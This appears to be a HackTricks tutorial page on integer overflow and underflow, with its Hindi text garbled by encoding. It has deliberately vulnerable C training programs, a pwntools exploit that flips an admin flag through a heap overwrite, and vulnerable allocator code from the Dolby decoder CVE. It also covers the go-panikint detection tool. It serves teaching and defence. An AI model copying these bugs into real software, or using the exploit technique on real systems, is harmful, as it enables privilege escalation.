# Integer Overflow

{{#include ../banners/hacktricks-training.md}}

## ‡§Æ‡•Ç‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä

‡§è‡§ï **integer overflow** ‡§ï‡•á ‡§Æ‡•Ç‡§≤ ‡§Æ‡•á‡§Ç ‡§ï‡§Ç‡§™‡•ç‡§Ø‡•Ç‡§ü‡§∞ ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ‡§ø‡§Ç‡§ó ‡§Æ‡•á‡§Ç ‡§°‡•á‡§ü‡§æ ‡§ü‡§æ‡§á‡§™‡•ç‡§∏ ‡§ï‡•á **‡§Ü‡§ï‡§æ‡§∞** ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§≤‡§ó‡§æ‡§è ‡§ó‡§è ‡§∏‡•Ä‡§Æ‡§æ‡§è‡§Å ‡§î‡§∞ ‡§°‡•á‡§ü‡§æ ‡§ï‡•Ä **‡§µ‡•ç‡§Ø‡§æ‡§ñ‡•ç‡§Ø‡§æ** ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§

‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§è‡§ï **8-bit unsigned integer** **0 ‡§∏‡•á 255** ‡§§‡§ï ‡§ï‡•á ‡§Æ‡§æ‡§® ‡§™‡•ç‡§∞‡§§‡§ø‡§®‡§ø‡§ß‡§ø‡§§‡•ç‡§µ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§Ü‡§™ 256 ‡§ï‡•ã ‡§è‡§ï 8-bit unsigned integer ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§á‡§∏‡§ï‡•Ä ‡§∏‡•ç‡§ü‡•ã‡§∞‡•á‡§ú ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•Ä ‡§∏‡•Ä‡§Æ‡§æ ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£ ‡§Ø‡§π 0 ‡§™‡§∞ wrap ‡§π‡•ã ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡•Ä ‡§§‡§∞‡§π, ‡§è‡§ï **16-bit unsigned integer**, ‡§ú‡•ã **0 ‡§∏‡•á 65,535** ‡§§‡§ï ‡§ï‡•á ‡§Æ‡§æ‡§® ‡§∞‡§ñ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§Æ‡•á‡§Ç 65,535 ‡§Æ‡•á‡§Ç 1 ‡§ú‡•ã‡§°‡§º‡§®‡•á ‡§∏‡•á ‡§Æ‡§æ‡§® ‡§´‡§ø‡§∞ ‡§∏‡•á 0 ‡§™‡§∞ wrap ‡§π‡•ã ‡§ú‡§æ‡§è‡§ó‡§æ‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§, ‡§è‡§ï **8-bit signed integer** **-128 ‡§∏‡•á 127** ‡§§‡§ï ‡§ï‡•á ‡§Æ‡§æ‡§® ‡§™‡•ç‡§∞‡§§‡§ø‡§®‡§ø‡§ß‡§ø‡§§‡•ç‡§µ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§ê‡§∏‡§æ ‡§á‡§∏‡§≤‡§ø‡§è ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§è‡§ï bit ‡§∏‡§Ç‡§ï‡•á‡§§ (positive ‡§Ø‡§æ negative) ‡§ï‡•ã ‡§¶‡§∞‡•ç‡§∂‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§™‡§∞‡§ø‡§Æ‡§æ‡§£ ‡§ï‡•ã ‡§¶‡§∞‡•ç‡§∂‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è 7 bit ‡§¨‡§ö‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§∏‡§¨‡§∏‡•á ‡§®‡§ï‡§æ‡§∞‡§æ‡§§‡•ç‡§Æ‡§ï ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ **-128** (binary `10000000`) ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§¶‡§∞‡•ç‡§∂‡§ø‡§§ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à, ‡§î‡§∞ ‡§∏‡§¨‡§∏‡•á ‡§ß‡§®‡§æ‡§§‡•ç‡§Æ‡§ï ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ **127** (binary `01111111`) ‡§π‡•à‡•§

‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø integer ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§ß‡§ø‡§ï‡§§‡§Æ ‡§Æ‡§æ‡§®:
| ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞           | ‡§Ü‡§ï‡§æ‡§∞ (bits) | ‡§®‡•ç‡§Ø‡•Ç‡§®‡§§‡§Æ ‡§Æ‡§æ‡§®          | ‡§Ö‡§ß‡§ø‡§ï‡§§‡§Æ ‡§Æ‡§æ‡§®          |
|----------------|-------------|--------------------|--------------------|
| int8_t         | 8           | -128               | 127                |
| uint8_t        | 8           | 0                  | 255                |
| int16_t        | 16          | -32,768            | 32,767             |
| uint16_t       | 16          | 0                  | 65,535            |
| int32_t        | 32          | -2,147,483,648 | 2,147,483,647      |
| uint32_t       | 32          | 0                  | 4,294,967,295      |
| int64_t        | 64          | -9,223,372,036,854,775,808 | 9,223,372,036,854,775,807 |
| uint64_t       | 64          | 0                  | 18,446,744,073,709,551,615 |

‡§è‡§ï short 64-‡§¨‡§ø‡§ü ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ‡•ç‡§∏ ‡§Æ‡•á‡§Ç `int16_t` ‡§ï‡•á ‡§¨‡§∞‡§æ‡§¨‡§∞ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§è‡§ï int `int32_t` ‡§ï‡•á ‡§¨‡§∞‡§æ‡§¨‡§∞ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§î‡§∞ ‡§è‡§ï long `int64_t` ‡§ï‡•á ‡§¨‡§∞‡§æ‡§¨‡§∞ ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§

### ‡§Ö‡§ß‡§ø‡§ï‡§§‡§Æ ‡§Æ‡§æ‡§®

‡§∏‡§Ç‡§≠‡§µ‡§ø‡§§ **web vulnerabilities** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ø‡§π ‡§ú‡§æ‡§®‡§®‡§æ ‡§¨‡§π‡•Å‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•à ‡§ï‡§ø ‡§Ö‡§ß‡§ø‡§ï‡§§‡§Æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§ø‡§§ ‡§Æ‡§æ‡§® ‡§ï‡•ç‡§Ø‡§æ ‡§π‡•à‡§Ç:

{{#tabs}}
{{#tab name="Rust"}}
```rust
fn main() {

let mut quantity = 2147483647;

let (mul_result, _) = i32::overflowing_mul(32767, quantity);
let (add_result, _) = i32::overflowing_add(1, quantity);

println!("{}", mul_result);
println!("{}", add_result);
}
```
{{#endtab}}

{{#tab name="C"}}
```c
#include <stdio.h>
#include <limits.h>

int main() {
int a = INT_MAX;
int b = 0;
int c = 0;

b = a * 100;
c = a + 1;

printf("%d\n", INT_MAX);
printf("%d\n", b);
printf("%d\n", c);
return 0;
}
```
{{#endtab}}
{{#endtabs}}

## ‡§â‡§¶‡§æ‡§π‡§∞‡§£

### Pure overflow

‡§™‡•ç‡§∞‡§ø‡§Ç‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§™‡§∞‡§ø‡§£‡§æ‡§Æ 0 ‡§π‡•ã‡§ó‡§æ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§π‡§Æ‡§®‡•á char ‡§ï‡•ã overflow ‡§ï‡§∞ ‡§¶‡§ø‡§Ø‡§æ:
```c
#include <stdio.h>

int main() {
unsigned char max = 255; // 8-bit unsigned integer
unsigned char result = max + 1;
printf("Result: %d\n", result); // Expected to overflow
return 0;
}
```
### Signed to Unsigned Conversion

‡§Æ‡§æ‡§® ‡§≤‡•Ä‡§ú‡§ø‡§è ‡§ï‡§ø ‡§è‡§ï signed integer user input ‡§∏‡•á ‡§™‡§¢‡§º‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§ê‡§∏‡•Ä context ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§á‡§∏‡•á unsigned integer ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§®‡§§‡§æ ‡§π‡•à, ‡§¨‡§ø‡§®‡§æ proper validation ‡§ï‡•á:
```c
#include <stdio.h>

int main() {
int userInput; // Signed integer
printf("Enter a number: ");
scanf("%d", &userInput);

// Treating the signed input as unsigned without validation
unsigned int processedInput = (unsigned int)userInput;

// A condition that might not work as intended if userInput is negative
if (processedInput > 1000) {
printf("Processed Input is large: %u\n", processedInput);
} else {
printf("Processed Input is within range: %u\n", processedInput);
}

return 0;
}
```
‡§á‡§∏ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç, ‡§Ø‡§¶‡§ø ‡§ï‡•ã‡§à ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§ï‡§æ‡§∞‡§æ‡§§‡•ç‡§Æ‡§ï ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§¶‡§∞‡•ç‡§ú ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§§‡•ã binary ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§ï‡•Ä ‡§µ‡•ç‡§Ø‡§æ‡§ñ‡•ç‡§Ø‡§æ ‡§ï‡•á ‡§§‡§∞‡•Ä‡§ï‡•á ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£ ‡§á‡§∏‡•á ‡§è‡§ï ‡§¨‡§°‡§º‡•á unsigned integer ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§µ‡•ç‡§Ø‡§æ‡§ñ‡•ç‡§Ø‡§æ‡§Ø‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§ú‡•ã ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ö‡§®‡§™‡•á‡§ï‡•ç‡§∑‡§ø‡§§ ‡§µ‡•ç‡§Ø‡§µ‡§π‡§æ‡§∞ ‡§ï‡§æ ‡§ï‡§æ‡§∞‡§£ ‡§¨‡§® ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

### macOS Overflow Example
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/*
* Realistic integer-overflow ‚Üí undersized allocation ‚Üí heap overflow ‚Üí flag
* Works on macOS arm64 (no ret2win required; avoids PAC/CFI).
*/

__attribute__((noinline))
void win(void) {
puts("üéâ EXPLOITATION SUCCESSFUL üéâ");
puts("FLAG{integer_overflow_to_heap_overflow_on_macos_arm64}");
exit(0);
}

struct session {
int is_admin;           // Target to flip from 0 ‚Üí 1
char note[64];
};

static size_t read_stdin(void *dst, size_t want) {
// Read in bounded chunks to avoid EINVAL on large nbyte (macOS PTY/TTY)
const size_t MAX_CHUNK = 1 << 20; // 1 MiB per read (any sane cap is fine)
size_t got = 0;

printf("Requested bytes: %zu\n", want);

while (got < want) {
size_t remain = want - got;
size_t chunk  = remain > MAX_CHUNK ? MAX_CHUNK : remain;

ssize_t n = read(STDIN_FILENO, (char*)dst + got, chunk);
if (n > 0) {
got += (size_t)n;
continue;
}
if (n == 0) {
// EOF ‚Äì stop; partial reads are fine for our exploit
break;
}
// n < 0: real error (likely EINVAL when chunk too big on some FDs)
perror("read");
break;
}
return got;
}


int main(void) {
setvbuf(stdout, NULL, _IONBF, 0);
puts("=== Bundle Importer (training) ===");

// 1) Read attacker-controlled parameters (use large values)
size_t count = 0, elem_size = 0;
printf("Entry count: ");
if (scanf("%zu", &count) != 1) return 1;
printf("Entry size: ");
if (scanf("%zu", &elem_size) != 1) return 1;

// 2) Compute total bytes with a 32-bit truncation bug (vulnerability)
//    NOTE: 'product32' is 32-bit ‚Üí wraps; then we add a tiny header.
uint32_t product32 = (uint32_t)(count * elem_size);//<-- Integer overflow because the product is converted to 32-bit.
/* So if you send "4294967296" (0x1_00000000 as count) and 1 as element --> 0x1_00000000 * 1 = 0 in 32bits
Then, product32 = 0
*/
uint32_t alloc32   = product32 + 32; // alloc32 = 0 + 32 = 32
printf("[dbg] 32-bit alloc = %u bytes (wrapped)\n", alloc32);

// 3) Allocate a single arena and lay out [buffer][slack][session]
//    This makes adjacency deterministic (no reliance on system malloc order).
const size_t SLACK = 512;
size_t arena_sz = (size_t)alloc32 + SLACK; // 32 + 512 = 544 (0x220)
unsigned char *arena = (unsigned char*)malloc(arena_sz);
if (!arena) { perror("malloc"); return 1; }
memset(arena, 0, arena_sz);

unsigned char *buf  = arena;  // In this buffer the attacker will copy data
struct session *sess = (struct session*)(arena + (size_t)alloc32 + 16); // The session is stored right after the buffer + alloc32 (32) + 16 = buffer + 48
sess->is_admin = 0;
strncpy(sess->note, "regular user", sizeof(sess->note)-1);

printf("[dbg] arena=%p buf=%p alloc32=%u sess=%p offset_to_sess=%zu\n",
(void*)arena, (void*)buf, alloc32, (void*)sess,
((size_t)alloc32 + 16)); // This just prints the address of the pointers to see that the distance between "buf" and "sess" is 48 (32 + 16).

// 4) Copy uses native size_t product (no truncation) ‚Üí It generates an overflow
size_t to_copy = count * elem_size;                   // <-- Large size_t
printf("[dbg] requested copy (size_t) = %zu\n", to_copy);

puts(">> Send bundle payload on stdin (EOF to finish)...");
size_t got = read_stdin(buf, to_copy); // <-- Heap overflow vulnerability that can bue abused to overwrite sess->is_admin to 1
printf("[dbg] actually read = %zu bytes\n", got);

// 5) Privileged action gated by a field next to the overflow target
if (sess->is_admin) {
puts("[dbg] admin privileges detected");
win();
} else {
puts("[dbg] normal user");
}
return 0;
}
```
‡§á‡§∏‡•á ‡§∏‡§Ç‡§ï‡§≤‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç:
```bash
clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 \
-o int_ovf_heap_priv int_ovf_heap_priv.c
```
#### Exploit
```python
# exploit.py
from pwn import *

# Keep logs readable; switch to "debug" if you want full I/O traces
context.log_level = "info"

EXE = "./int_ovf_heap_priv"

def main():
# IMPORTANT: use plain pipes, not PTY
io = process([EXE])  # stdin=PIPE, stdout=PIPE by default

# 1) Drive the prompts
io.sendlineafter(b"Entry count: ", b"4294967296")  # 2^32 -> (uint32_t)0
io.sendlineafter(b"Entry size: ",  b"1")           # alloc32 = 32, offset_to_sess = 48

# 2) Wait until it‚Äôs actually reading the payload
io.recvuntil(b">> Send bundle payload on stdin (EOF to finish)...")

# 3) Overflow 48 bytes, then flip is_admin to 1 (little-endian)
payload = b"A" * 48 + p32(1)

# 4) Send payload, THEN send EOF via half-close on the pipe
io.send(payload)
io.shutdown("send")   # <-- this delivers EOF when using pipes, it's needed to stop the read loop from the binary

# 5) Read the rest (should print admin + FLAG)
print(io.recvall(timeout=5).decode(errors="ignore"))

if __name__ == "__main__":
main()
```
### macOS Underflow ‡§â‡§¶‡§æ‡§π‡§∞‡§£
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/*
* Integer underflow -> undersized allocation + oversized copy -> heap overwrite
* Works on macOS arm64. Data-oriented exploit: flip sess->is_admin.
*/

__attribute__((noinline))
void win(void) {
puts("üéâ EXPLOITATION SUCCESSFUL üéâ");
puts("FLAG{integer_underflow_heap_overwrite_on_macos_arm64}");
exit(0);
}

struct session {
int  is_admin;      // flip 0 -> 1
char note[64];
};

static size_t read_stdin(void *dst, size_t want) {
// Read in bounded chunks so huge 'want' doesn't break on PTY/TTY.
const size_t MAX_CHUNK = 1 << 20; // 1 MiB
size_t got = 0;
printf("[dbg] Requested bytes: %zu\n", want);
while (got < want) {
size_t remain = want - got;
size_t chunk  = remain > MAX_CHUNK ? MAX_CHUNK : remain;
ssize_t n = read(STDIN_FILENO, (char*)dst + got, chunk);
if (n > 0) { got += (size_t)n; continue; }
if (n == 0) break;    // EOF: partial read is fine
perror("read"); break;
}
return got;
}

int main(void) {
setvbuf(stdout, NULL, _IONBF, 0);
puts("=== Packet Importer (UNDERFLOW training) ===");

size_t total_len = 0;
printf("Total packet length: ");
if (scanf("%zu", &total_len) != 1) return 1; // Suppose it's "8"

const size_t HEADER = 16;

// **BUG**: size_t underflow if total_len < HEADER
size_t payload_len = total_len - HEADER;   // <-- UNDERFLOW HERE if total_len < HEADER --> Huge number as it's unsigned
// If total_len = 8, payload_len = 8 - 16 = -8 = 0xfffffffffffffff8 = 18446744073709551608 (on 64bits - huge number)
printf("[dbg] total_len=%zu, HEADER=%zu, payload_len=%zu\n",
total_len, HEADER, payload_len);

// Build a deterministic arena: [buf of total_len][16 gap][session][slack]
const size_t SLACK = 256;
size_t arena_sz = total_len + 16 + sizeof(struct session) + SLACK; // 8 + 16 + 72 + 256 = 352 (0x160)
unsigned char *arena = (unsigned char*)malloc(arena_sz);
if (!arena) { perror("malloc"); return 1; }
memset(arena, 0, arena_sz);

unsigned char *buf  = arena;
struct session *sess = (struct session*)(arena + total_len + 16);
// The offset between buf and sess is total_len + 16 = 8 + 16 = 24 (0x18)
sess->is_admin = 0;
strncpy(sess->note, "regular user", sizeof(sess->note)-1);

printf("[dbg] arena=%p buf=%p total_len=%zu sess=%p offset_to_sess=%zu\n",
(void*)arena, (void*)buf, total_len, (void*)sess, total_len + 16);

puts(">> Send payload bytes (EOF to finish)...");
size_t got = read_stdin(buf, payload_len);
// The offset between buf and sess is 24 and the payload_len is huge so we can overwrite sess->is_admin to set it as 1
printf("[dbg] actually read = %zu bytes\n", got);

if (sess->is_admin) {
puts("[dbg] admin privileges detected");
win();
} else {
puts("[dbg] normal user");
}
return 0;
}
```
‡§á‡§∏‡•á Compile ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è:
```bash
clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 \
-o int_underflow_heap int_underflow_heap.c
```
### Allocator alignment rounding wrap ‚Üí undersized chunk ‚Üí heap overflow (Dolby UDC case)

‡§ï‡•Å‡§õ custom allocators overflow ‡§ï‡•Ä ‡§™‡•Å‡§®‡§É ‡§ú‡§æ‡§Å‡§ö ‡§ï‡§ø‡§è ‡§¨‡§ø‡§®‡§æ allocations ‡§ï‡•ã alignment ‡§§‡§ï round ‡§ï‡§∞ ‡§¶‡•á‡§§‡•á ‡§π‡•à‡§Ç‡•§ Dolby Unified Decoder (Pixel 9, CVE-2025-54957) ‡§Æ‡•á‡§Ç, attacker-controlled `emdf_payload_size` (‡§ú‡•ã unbounded `variable_bits(8)` loop ‡§∏‡•á decode ‡§π‡•ã‡§§‡§æ ‡§π‡•à) ‡§ï‡•ã `ddp_udc_int_evo_malloc` ‡§Æ‡•á‡§Ç feed ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à:
```c
size_t total_size = alloc_size + extra;
if (alloc_size + extra < alloc_size) return 0; // initial wrap guard
if (total_size % 8)
total_size += (8 - total_size) % total_size; // vulnerable rounding
if (total_size > heap->remaining) return 0;
```
64-bit ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡•ã `0xFFFFFFFFFFFFFFF9` ‡§ï‡•á ‡§Ü‡§∏‡§™‡§æ‡§∏ ‡§π‡•à‡§Ç, `(8 - total_size) % total_size` ‡§ú‡•ã‡§°‡§º wrap-around ‡§π‡•ã ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§è‡§ï **‡§õ‡•ã‡§ü‡§æ `total_size`** ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§≠‡§≤‡•á ‡§π‡•Ä ‡§§‡§æ‡§∞‡•ç‡§ï‡§ø‡§ï `alloc_size` ‡§¨‡§π‡•Å‡§§ ‡§¨‡§°‡§º‡§æ ‡§¨‡§®‡§æ ‡§∞‡§π‡•á‡•§ ‡§ï‡•â‡§≤‡§∞ ‡§¨‡§æ‡§¶ ‡§Æ‡•á‡§Ç ‡§≤‡•å‡§ü‡§æ‡§è ‡§ó‡§è chunk ‡§Æ‡•á‡§Ç `payload_length` ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§≤‡§ø‡§ñ‡§§‡§æ ‡§π‡•à:
```c
buffer = ddp_udc_int_evo_malloc(evo_heap, payload_length, extra);
for (size_t i = 0; i < payload_length; i++) { // bounds use logical size
buffer[i] = next_byte_from_emdf();       // writes past tiny chunk
}
```
Why exploitation is reliable in this pattern:
- **Overflow length control:** Bytes ‡§ï‡•ã reader ‡§∏‡•á ‡§≤‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§¶‡•Ç‡§∏‡§∞‡•á attacker-chosen length (`emdf_container_length`) ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ capped ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è write N bytes ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§∞‡•Å‡§ï ‡§ú‡§æ‡§§‡§æ ‡§π‡•à instead of spraying `payload_length`.
- **Overflow data control:** chunk ‡§ï‡•á ‡§™‡§æ‡§∞ ‡§≤‡§ø‡§ñ‡•á ‡§ó‡§è Bytes ‡§™‡•Ç‡§∞‡•Ä ‡§§‡§∞‡§π attacker-supplied ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç from the EMDF payload.
- **Heap determinism:** The allocator per-frame bump-pointer slab ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§ï‡•ã‡§à frees ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è corrupted objects ‡§ï‡•Ä adjacency predictable ‡§π‡•ã‡§§‡•Ä ‡§π‡•à.

## Other Examples

- [https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html)
- Only 1B is used to store the size of the password so it's possible to overflow it and make it think it's length of 4 while it actually is 260 to bypass the length check protection
- [https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/index.html)

- Given a couple of numbers find out using z3 a new number that multiplied by the first one will give the second one:

```
(((argv[1] * 0x1064deadbeef4601) & 0xffffffffffffffff) == 0xD1038D2E07B42569)
```

- [https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/)
- Only 1B is used to store the size of the password so it's possible to overflow it and make it think it's length of 4 while it actually is 260 to bypass the length check protection and overwrite in the stack the next local variable and bypass both protections

## Go integer overflow detection with go-panikint

Go wraps integers silently. [go-panikint](https://github.com/trailofbits/go-panikint) is a forked Go toolchain that injects SSA overflow checks so wrapped arithmetic immediately calls `runtime.panicoverflow()` (panic + stack trace).

**Why use it**

- Makes overflow/truncation reachable in fuzzing/CI because arithmetic wraps now crash.
- Useful around user-controlled pagination, offsets, quotas, size calculations, or access-control math (e.g., `end := offset + limit` on `uint64` wrapping small).

**Build & use**
```bash
git clone https://github.com/trailofbits/go-panikint
cd go-panikint/src && ./make.bash
export GOROOT=/path/to/go-panikint
./bin/go test -fuzz=FuzzOverflowHarness
```
Run this forked `go` binary for tests/fuzzing to surface overflows as panics.

**‡§∂‡•ã‡§∞ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£**

- Truncation checks (casts to smaller ints) ‡§ï‡§æ‡§´‡•Ä noisy ‡§π‡•ã ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
- ‡§ú‡§æ‡§®‡§¨‡•Ç‡§ù‡§ï‡§∞ wrap-around ‡§ï‡•ã source-path filters ‡§Ø‡§æ inline `// overflow_false_positive` / `// truncation_false_positive` ‡§ü‡§ø‡§™‡•ç‡§™‡§£‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á suppress ‡§ï‡§∞‡•á‡§Ç‡•§

**‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï ‡§¶‡•Å‡§®‡§ø‡§Ø‡§æ ‡§ï‡§æ ‡§™‡•à‡§ü‡§∞‡•ç‡§®**

go-panikint ‡§®‡•á ‡§è‡§ï Cosmos SDK `uint64` pagination overflow ‡§ï‡•ã ‡§â‡§ú‡§æ‡§ó‡§∞ ‡§ï‡§ø‡§Ø‡§æ: `end := pageRequest.Offset + pageRequest.Limit` ‡§®‡•á `MaxUint64` ‡§ï‡•á ‡§™‡§æ‡§∞ wrap ‡§ï‡§∞ ‡§≤‡§ø‡§Ø‡§æ, ‡§ú‡§ø‡§∏‡§∏‡•á empty results ‡§≤‡•å‡§ü‡•á‡•§ Instrumentation ‡§®‡•á ‡§â‡§∏ silent wrap ‡§ï‡•ã ‡§è‡§ï panic ‡§Æ‡•á‡§Ç ‡§¨‡§¶‡§≤ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§ø‡§∏‡•á fuzzers minimize ‡§ï‡§∞ ‡§∏‡§ï‡•á‡•§

## ARM64

‡§Ø‡§π ARM64 ‡§Æ‡•á‡§Ç **‡§¨‡§¶‡§≤‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à** ‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø ‡§Ü‡§™ [**this blog post**](https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/) ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

## References

- [Detect Go‚Äôs silent arithmetic bugs with go-panikint](https://blog.trailofbits.com/2025/12/31/detect-gos-silent-arithmetic-bugs-with-go-panikint/)
- [go-panikint (compiler fork)](https://github.com/trailofbits/go-panikint)
- [Pixel 0-click ‚Äì CVE-2025-54957 allocator wrap ‚Üí heap overflow](https://projectzero.google/2026/01/pixel-0-click-part-1.html)

{{#include ../banners/hacktricks-training.md}}
